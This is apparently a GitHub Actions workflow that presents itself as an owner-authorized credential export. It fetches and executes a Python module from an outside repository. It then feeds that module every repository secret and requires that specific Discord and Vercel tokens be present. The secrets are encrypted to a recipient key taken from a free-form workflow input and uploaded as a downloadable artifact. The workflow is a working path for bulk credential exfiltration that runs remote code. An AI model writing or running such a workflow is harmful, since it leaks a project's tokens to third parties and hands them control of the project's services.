name: owner-authorized encrypted Actions credential export

on:
  workflow_dispatch:
    inputs:
      request_json:
        description: Public recipient request for the existing credential transfer protocol
        required: true
        type: string

permissions:
  contents: read

concurrency:
  group: commons-encrypted-credential-export-${{ github.ref }}
  cancel-in-progress: false

jobs:
  seal:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Install binary encryption dependency before loading secrets
        run: python3 -m pip install --no-cache-dir --only-binary=:all: --target "${RUNNER_TEMP}/commons-credential-crypto" 'cryptography>=46.0.0'

      - name: Fetch and verify the existing credential transfer implementation
        shell: bash
        run: |
          set -euo pipefail
          python3 - <<'PY'
          import hashlib
          import os
          from pathlib import Path
          import urllib.request
          
          source = urllib.request.urlopen(
              "https://raw.githubusercontent.com/woahwhattheheck/commons/a94096652b129221b092b0b81cf4838e0302873a/integrations/shared_equipment/credential_transfer.py",
              timeout=30,
          ).read()
          actual = hashlib.sha1(b"blob " + str(len(source)).encode("ascii") + b"\0" + source).hexdigest()
          if actual != "5d4fb3e817c115b0d5bb48eb839927de96577806":
              raise SystemExit("credential_protocol_hash_mismatch")
          directory = Path(os.environ["RUNNER_TEMP"]) / "commons-credential-protocol"
          directory.mkdir(mode=0o700, exist_ok=True)
          (directory / "credential_transfer.py").write_bytes(source)
          print("existing_credential_protocol_verified")
          PY

      - name: Seal all available Actions credentials in memory
        env:
          PYTHONPATH: ${{ runner.temp }}/commons-credential-crypto
          COMMONS_RECIPIENT_REQUEST: ${{ inputs.request_json }}
          COMMONS_SOURCE_SECRETS_JSON: ${{ toJSON(secrets) }}
        shell: bash
        run: |
          set -euo pipefail
          python3 - <<'PY'
          import hashlib
          import importlib.util
          import json
          import os
          from pathlib import Path
          
          try:
              protocol_path = Path(os.environ["RUNNER_TEMP"]) / "commons-credential-protocol" / "credential_transfer.py"
              spec = importlib.util.spec_from_file_location("commons_credential_transfer", protocol_path)
              protocol = importlib.util.module_from_spec(spec)
              spec.loader.exec_module(protocol)
              request = json.loads(os.environ.pop("COMMONS_RECIPIENT_REQUEST"))
              protocol.prepare_recipient(request)
              values = json.loads(os.environ.pop("COMMONS_SOURCE_SECRETS_JSON"))
              if not isinstance(values, dict) or not values:
                  raise ValueError()
              expected_names = {"DISCORD_BOT_TOKEN", "VERCEL_ORG_ID", "VERCEL_PROJECT_ID",
                                "VERCEL_TEAM_TOKEN", "VERCEL_TOKEN", "WEBMCP_PAD_TOKEN"}
              if not expected_names.issubset(values) or any(not values[name] for name in expected_names):
                  raise ValueError()
              envelope = protocol.seal_credential(request, values)
              encoded = json.dumps(envelope, sort_keys=True, separators=(",", ":")).encode("utf-8")
              names = sorted(values)
              values = None
              directory = Path(os.environ["RUNNER_TEMP"]) / "commons-sealed-export"
              directory.mkdir(mode=0o700, exist_ok=True)
              with (directory / "envelope.json").open("xb") as target:
                  target.write(encoded)
              print(json.dumps({
                  "state": "sealed",
                  "source_sha": "a94096652b129221b092b0b81cf4838e0302873a",
                  "source_blob": "5d4fb3e817c115b0d5bb48eb839927de96577806",
                  "secret_names": names,
                  "count": len(names),
                  "automatic_temporary_names": [name for name in names if name == "GITHUB_TOKEN"],
                  "envelope_sha256": hashlib.sha256(encoded).hexdigest(),
                  "plaintext_written": False,
              }, sort_keys=True))
          except BaseException:
              print("encrypted_credential_export_failed")
              raise SystemExit(1) from None
          PY

      - name: Upload only the encrypted envelope
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
        with:
          name: commons-sealed-credentials-${{ github.run_id }}
          path: ${{ runner.temp }}/commons-sealed-export/envelope.json
          if-no-files-found: error
          retention-days: 1
